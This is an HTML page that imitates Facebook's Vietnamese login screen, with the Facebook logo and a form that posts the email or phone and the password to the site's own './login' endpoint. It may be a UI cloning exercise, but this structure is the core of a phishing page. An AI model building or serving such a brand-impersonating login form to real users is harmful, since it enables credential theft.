<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>Facebook - Đăng nhập hoặc đăng ký</title>
    <link rel="stylesheet" type="text/css" href="./assets/css/style.css">
    <link rel="icon" href="./images/favicon.gif" type="image/gif" />
</head>

<body>
    <div class="upper_part">
        <div class="inner_upper">
            <div class="inner_left">
                <div class="icon">
                    <img class="login_icon" src="./images/facebook.svg" alt="Facebook">
                </div>
                <h2 class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
            </div>
            <div class="inner_right">
                <div class="inner_inner_right">
                    <div class="login_form_outer">
                        <form action="./login" method="POST">
                            <div>
                                <div class="email_or_phone">
                                    <input class="textinput" type="text" name="email" id="email"
                                        placeholder="Email hoặc số điện thoại">
                                </div>
                                <div class="password">
                                    <input class="textinput" type="password" name="pass" id="pass"
                                        placeholder="Mật khẩu">
                                </div>
                                <div class="login_button_outer">
                                    <button class="login_button" name="login" type="submit">Đăng nhập</button>
                                </div>
                                <div class="forgot_pass">
                                    <a href="./recover">Quên mật khẩu?</a>
                                </div>
                                <div class="fb_hr"></div>
                                <div class="create_acc_outer">
                                    <a href="./register/" role="button" class="create_acc">Tạo tài khoản mới</a>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="reg_page_msg">
                        <a href="./pages/create/?ref_type=registration_form" class="create_page_btn">Tạo Trang</a> dành
                        cho người nổi tiếng, nhãn hiệu hoặc doanh<br>nghiệp.
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div>
        <div class="inner_bottom">
            <div id="pageFooter">
                <ul class="localeSelectorList">
                    <li>Tiếng Việt</li>
                    <li><a href="#">English (UK)</a></li>
                    <li><a href="#">Русский</a></li>
                </ul>
                <div id="seperator"></div>
                <div id="pageFooterChildren">
                    <ul class="uiList">
                        <li><a href="/r.php" title="Đăng ký Facebook">Đăng ký</a></li>
                        <li><a href="/login" title="Đăng nhập Facebook">Đăng nhập</a></li>
                        <li><a href="/messsages" title="Xem Messenger">Messenger</a></li>
                        <li><a href="/jobs" title="Xem việc làm">Việc làm</a></li>
                        <li><a href="/about" title="Xem giới thiệu">Giới thiệu</a></li>
                        <li><a href="/developers" title="Xem nhà phát triển">Nhà phát triển</a></li>
                        <li><a href="/careers" title="Xem tuyển dụng">Tuyển dụng</a></li>
                        <li><a href="/privacy" title="Xem quyền riêng tư">Quyền riêng tư</a></li>
                        <li><a href="/policies" title="Xem điều khoản">Điều khoản</a></li>
                        <li><a href="/policies/cookies" title="Xem điều khoản Cookie">Cookie</a></li>
                        <li><a href="/help" title="Xem trợ giúp">Trợ giúp</a></li>
                    </ul>
                </div>
                <div class="copyright">
                    <div>
                        <span>Fatties Software &copy; <?php echo date("Y") ?></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>